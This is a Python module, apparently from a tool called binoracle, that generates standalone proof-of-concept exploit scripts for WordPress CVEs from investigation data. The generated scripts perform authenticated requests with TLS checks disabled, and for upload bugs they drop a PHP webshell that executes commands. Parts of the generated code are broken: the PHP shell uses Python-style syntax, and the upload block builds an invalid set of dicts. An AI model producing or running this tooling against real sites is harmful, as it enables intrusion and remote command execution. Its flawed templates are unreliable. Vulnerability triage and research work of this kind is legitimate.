"""Standalone PoC generator.

Takes a verified investigation + WpVerifyResult and emits a self-contained
Python 3.8+ script (stdlib + requests) that any triager can run against
their own target without the binoracle Docker lab.
"""
from __future__ import annotations

import json
import os
import textwrap
from typing import Any, Optional


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def poc_filename(cve_id: str) -> str:
    """Return normalised PoC filename, e.g. 'poc_CVE-2024-12345.py'."""
    cid = (cve_id or "UNKNOWN").strip().upper()
    if not cid.startswith("CVE-"):
        cid = "CVE-" + cid
    return f"poc_{cid}.py"


def generate_standalone_poc(inv: Any, wr: Any = None, output_path: Optional[str] = None) -> str:
    """Generate a standalone Python PoC script from investigation data.

    Parameters
    ----------
    inv:  Investigation object or dict with CVE / exploit metadata.
    wr:   WpVerifyResult (optional) — extra evidence / exploit_poc overrides.
    output_path: If given, writes the script to this path.

    Returns the script as a string.
    """
    d = _as_dict(inv)
    wr_d = _as_dict(wr) if wr is not None else {}

    cve_id      = d.get("cve_id") or d.get("cve") or "UNKNOWN"
    vuln_class  = d.get("vuln_class") or d.get("vuln_type") or "unknown"
    endpoint    = d.get("endpoint") or d.get("target_endpoint") or "/"
    method      = (d.get("http_method") or d.get("method") or "GET").upper()
    parameters  = _coerce_params(d.get("parameters") or d.get("params") or {})
    payload     = str(d.get("payload") or d.get("sqli_payload") or "")
    confirm_str = d.get("confirm_string") or d.get("confirm") or ""
    auth_req    = bool(d.get("auth_required") or d.get("authenticated"))
    description = d.get("title") or d.get("description") or ""
    severity    = _guess_severity(vuln_class)

    # WpVerifyResult overrides
    ep_poc = wr_d.get("exploit_poc") or {}
    if isinstance(ep_poc, dict):
        if ep_poc.get("endpoint"):
            endpoint = ep_poc["endpoint"]
        if ep_poc.get("method"):
            method = ep_poc["method"].upper()
        if ep_poc.get("parameters"):
            parameters = _coerce_params(ep_poc["parameters"])
        if ep_poc.get("confirm_string"):
            confirm_str = ep_poc["confirm_string"]

    is_upload   = vuln_class in ("arbitrary-file-upload", "file-upload")
    is_sqli     = vuln_class in ("sql-injection", "sqli")
    is_ssrf     = vuln_class == "ssrf"
    json_body   = method in ("POST", "PUT", "PATCH") and not is_upload

    script = _build_script(
        cve_id=cve_id,
        vuln_class=vuln_class,
        severity=severity,
        description=description,
        endpoint=endpoint,
        method=method,
        parameters=parameters,
        payload=payload,
        confirm_str=confirm_str,
        auth_req=auth_req,
        is_upload=is_upload,
        is_sqli=is_sqli,
        is_ssrf=is_ssrf,
        json_body=json_body,
    )

    if output_path:
        os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as fh:
            fh.write(script)

    return script


# ---------------------------------------------------------------------------
# Script builder
# ---------------------------------------------------------------------------

def _build_script(*, cve_id, vuln_class, severity, description,
                  endpoint, method, parameters, payload, confirm_str,
                  auth_req, is_upload, is_sqli, is_ssrf, json_body) -> str:

    params_repr = json.dumps(parameters, indent=4)
    confirm_repr = repr(confirm_str)

    auth_args = ""
    auth_setup = ""
    if auth_req:
        auth_args = textwrap.dedent("""\
            ap.add_argument("--user", default="", help="WordPress username")
            ap.add_argument("--pass", dest="password", default="", help="WordPress password")
        """)
        auth_setup = textwrap.dedent("""\
            if args.user:
                s = requests.Session()
                login_r = s.post(args.target.rstrip("/") + "/wp-login.php",
                                 data={"log": args.user, "pwd": args.password,
                                       "wp-submit": "Log In", "redirect_to": "/wp-admin/",
                                       "testcookie": "1"},
                                 timeout=15, verify=False, allow_redirects=True)
                if "wordpress_logged_in" not in login_r.cookies:
                    sys.exit(f"Login failed for {args.user!r} — HTTP {login_r.status_code}")
                print(f"[+] Logged in as {args.user!r}")
            else:
                s = requests.Session()
        """)
    else:
        auth_setup = "s = requests.Session()\n"

    if is_upload:
        request_block = textwrap.dedent("""\
            # File-upload exploit: sends PHP webshell as multipart form data
            shell_name = "binoracle_poc.php"
            shell_code = b"<?php echo 'PWNED:'.shell_exec($_GET.get('cmd','id')); ?>"
            files = {{"file": (shell_name, shell_code, "application/x-php")}}
            data  = {{k: v for k, v in params.items() if k != "file"}}
            r = s.request(METHOD, url, files=files, data=data,
                          timeout=20, verify=False, allow_redirects=True)
        """)
    elif json_body:
        request_block = textwrap.dedent("""\
            r = s.request(METHOD, url, json=params,
                          timeout=20, verify=False, allow_redirects=True)
        """)
    elif method == "GET":
        request_block = textwrap.dedent("""\
            r = s.request(METHOD, url, params=params,
                          timeout=20, verify=False, allow_redirects=True)
        """)
    else:
        request_block = textwrap.dedent("""\
            r = s.request(METHOD, url, data=params,
                          timeout=20, verify=False, allow_redirects=True)
        """)

    if confirm_str:
        verify_block = textwrap.dedent(f"""\
            cs = {confirm_repr}
            if cs and cs in r.text:
                print(f"[PASS] confirm_string found: {{cs!r}}")
                print(f"       HTTP {{r.status_code}} | {{len(r.text)}} bytes")
                sys.exit(0)
            else:
                print(f"[FAIL] confirm_string {{cs!r}} NOT found in response")
                print(f"       HTTP {{r.status_code}} | body[:300]: {{r.text[:300]!r}}")
                sys.exit(1)
        """)
    else:
        verify_block = textwrap.dedent("""\
            if r.status_code in (200, 201, 204):
                print(f"[PASS] HTTP {r.status_code} — endpoint accessible without auth")
                print(f"       body[:300]: {r.text[:300]!r}")
                sys.exit(0)
            else:
                print(f"[FAIL] HTTP {r.status_code} — endpoint rejected or not found")
                print(f"       body[:200]: {r.text[:200]!r}")
                sys.exit(1)
        """)

    script = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        Standalone PoC — {cve_id}
        Vuln class : {vuln_class}
        Severity   : {severity}
        Description: {description or '(see CVE advisory)'}

        Generated by binoracle poc_generator.
        Run: python3 {poc_filename(cve_id)} --target https://victim.example.com
        \"\"\"
        import argparse
        import sys
        import warnings

        import requests
        warnings.filterwarnings("ignore", message="Unverified HTTPS")

        METHOD   = {method!r}
        ENDPOINT = {endpoint!r}
        PARAMS   = {params_repr}


        def main():
            ap = argparse.ArgumentParser(description="PoC for {cve_id}")
            ap.add_argument("--target", required=True,
                            help="Base URL of target, e.g. https://victim.example.com")
            {_indent(auth_args, 4)}
            args = ap.parse_args()

            url = args.target.rstrip("/") + ENDPOINT
            params = dict(PARAMS)
            print(f"[*] Target  : {{args.target}}")
            print(f"[*] Endpoint: {{METHOD}} {{url}}")
            print(f"[*] Params  : {{params}}")

            {_indent(auth_setup, 4)}
            {_indent(request_block, 4)}
            {_indent(verify_block, 4)}


        if __name__ == "__main__":
            main()
        """)

    return script


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _as_dict(obj: Any) -> dict:
    if obj is None:
        return {}
    if isinstance(obj, dict):
        return obj
    # dataclass / namedtuple / object with __dict__
    if hasattr(obj, "__dict__"):
        return vars(obj)
    # WpVerifyResult may expose evidence dict
    if hasattr(obj, "evidence") and isinstance(obj.evidence, dict):
        d = {}
        for attr in ("verified", "ok", "detail", "exploit_poc", "confidence"):
            if hasattr(obj, attr):
                d[attr] = getattr(obj, attr)
        d.update(obj.evidence)
        return d
    return {}


def _coerce_params(params: Any) -> dict:
    if isinstance(params, dict):
        return {str(k): str(v) for k, v in params.items()}
    if isinstance(params, (list, tuple)):
        result = {}
        for item in params:
            if isinstance(item, dict):
                result.update({str(k): str(v) for k, v in item.items()})
            elif isinstance(item, str) and "=" in item:
                k, _, v = item.partition("=")
                result[k] = v
        return result
    return {}


def _guess_severity(vuln_class: str) -> str:
    high = {"rce", "arbitrary-file-upload", "file-upload", "sqli", "sql-injection",
            "ssrf", "path-traversal", "broken-authentication"}
    medium = {"xss", "csrf", "missing-authorization", "broken-access-control",
              "idor", "open-redirect"}
    vc = (vuln_class or "").lower()
    if vc in high:
        return "HIGH / CRITICAL"
    if vc in medium:
        return "MEDIUM"
    return "MEDIUM (review required)"


def _indent(text: str, spaces: int) -> str:
    if not text.strip():
        return ""
    pad = " " * spaces
    lines = text.rstrip().splitlines()
    return ("\n" + pad).join(lines)


# ---------------------------------------------------------------------------
# CLI entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys as _sys

    if len(_sys.argv) < 2:
        print("Usage: python3 poc_generator.py <investigation.json> [output.py]")
        _sys.exit(1)

    with open(_sys.argv[1], encoding="utf-8") as _f:
        _inv = json.load(_f)

    _out = _sys.argv[2] if len(_sys.argv) > 2 else None
    _script = generate_standalone_poc(_inv, output_path=_out)
    if not _out:
        print(_script)
    else:
        print(f"PoC written to {_out}")
